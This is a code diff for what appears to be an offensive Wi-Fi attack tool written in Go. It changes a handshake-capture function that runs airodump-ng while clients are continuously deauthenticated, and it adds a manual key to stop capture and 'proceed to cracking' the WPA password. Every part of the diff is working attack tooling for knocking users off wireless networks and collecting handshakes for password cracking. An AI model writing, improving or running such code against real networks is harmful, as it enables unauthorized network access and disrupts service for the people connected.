@@ -385,7 +385,8 @@ func captureHandshake(monitorInterface string, target Network) string {
 
 	fmt.Printf("\n[+] Capturing handshake on channel %s...\n", channel)
 	fmt.Println("[+] Continuously deauthenticating clients until handshake is captured...")
-	fmt.Println("[!] This may take a few minutes. Press Ctrl+C to abort")
+	fmt.Println("[!] This may take a few minutes.")
+	fmt.Println("[!] Press 's' and Enter at any time to stop capture and proceed to cracking.")
 
 	// Start capture in background
 	cmd := exec.Command("sudo", "airodump-ng",
@@ -447,60 +448,66 @@ func captureHandshake(monitorInterface string, target Network) string {
 
 		for {
 			select {
+			case <-stopDeauth:
+				return // Stop checking if deauth/capture is stopped
 			case <-ticker.C:
 				checkCount++
-				fmt.Printf("\n[*] Handshake check #%d (checking every 5s)...\n", checkCount)
+				// Don't clutter UI too much, but show we are alive
+				// fmt.Printf("\n[*] Handshake check #%d...\n", checkCount)
 
 				// Check if capture file exists
 				if _, err := os.Stat(capFileName); err == nil {
-					fmt.Printf("[*] Capture file found: %s\n", capFileName)
-
-					// Get file size for logging
-					if fileInfo, err := os.Stat(capFileName); err == nil {
-						fmt.Printf("[*] Capture file size: %d bytes\n", fileInfo.Size())
-					}
-
-					// Check if handshake is present in the capture file
-					fmt.Printf("[*] Checking for WPA handshake in capture file...\n")
 					if hasHandshake(capFileName, target.BSSID) {
-						fmt.Println("\n[✓] WPA handshake detected!")
+						fmt.Println("\n[✓] WPA handshake detected by auto-scan!")
 						handshakeDetected <- true
 						return
-					} else {
-						fmt.Printf("[*] No handshake found yet, continuing to wait...\n")
 					}
-				} else {
-					fmt.Printf("[*] Capture file not found yet: %s (waiting...)\n", capFileName)
 				}
 			}
 		}
 	}()
 
-	// Wait for handshake detection with timeout (10 minutes max)
+	// Listen for user manual stop ('s')
+	userStopped := make(chan bool, 1)
+	go func() {
+		scanner := bufio.NewScanner(os.Stdin)
+		for scanner.Scan() {
+			text := strings.TrimSpace(scanner.Text())
+			if text == "s" || text == "S" {
+				userStopped <- true
+				return
+			}
+		}
+	}()
+
+	// Wait for handshake detection, user stop, or timeout
 	timeout := time.After(10 * time.Minute)
+
+	// Helper to cleanup
+	cleanup := func() {
+		stopDeauth <- true // Signals deauth loop and handshake checker to stop
+		time.Sleep(1 * time.Second)
+		if cmd.Process != nil {
+			cmd.Process.Kill()
+			cmd.Wait()
+		}
+	}
+
 	select {
 	case <-handshakeDetected:
-		// Handshake detected, stop deauth and capture
-		stopDeauth <- true
-		time.Sleep(1 * time.Second) // Give time for last deauth to complete
-
-		// Kill capture process
-		if cmd.Process != nil {
-			cmd.Process.Kill()
-			cmd.Wait()
-		}
-
-		fmt.Println("[✓] Capture stopped. Handshake file ready.")
+		cleanup()
+		fmt.Println("[✓] Capture stopped via auto-detection.")
 		return captureFile + "-01.cap"
+
+	case <-userStopped:
+		fmt.Println("\n[!] User manually stopped capture.")
+		cleanup()
+		return captureFile + "-01.cap"
+
 	case <-timeout:
-		// Timeout reached
-		stopDeauth <- true
-		if cmd.Process != nil {
-			cmd.Process.Kill()
-			cmd.Wait()
-		}
-		log.Fatal("[-] Timeout: No handshake captured after 10 minutes. Try again or check if clients are connected.")
-		return "" // Never reached, but satisfies compiler
+		cleanup()
+		log.Fatal("[-] Timeout: No handshake captured after 10 minutes.")
+		return ""
 	}
 }
 
